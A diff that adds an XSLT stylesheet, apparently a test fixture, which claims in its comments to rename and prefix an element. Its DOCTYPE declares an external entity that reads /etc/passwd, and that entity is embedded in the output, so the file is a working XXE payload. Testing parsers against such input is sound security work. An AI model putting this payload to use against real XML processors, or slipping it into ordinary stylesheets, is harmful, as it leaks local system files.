@@ -1,0 +1,20 @@
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE stylesheet [ <!ELEMENT stylesheet ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" > ]>
+<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0">
+    <xsl:output method="xml" encoding="UTF-8" />
+
+    <!-- Match the root element <MyElement> and rename it to <MyNewElement> -->
+    <xsl:template match="MyElement">
+        <MyNewElement>
+            <!-- Prefix the content of <MyElement> with "New" -->
+            <xsl:text>New&xxe;</xsl:text>
+            <xsl:value-of select="." />
+        </MyNewElement>
+    </xsl:template>
+
+    <!-- Copy any other elements and text as-is (identity transformation) -->
+    <xsl:template match="@*|node()">
+        <xsl:copy>
+            <xsl:apply-templates select="@*|node()" />
+        </xsl:copy>
+    </xsl:template>
+</xsl:stylesheet>
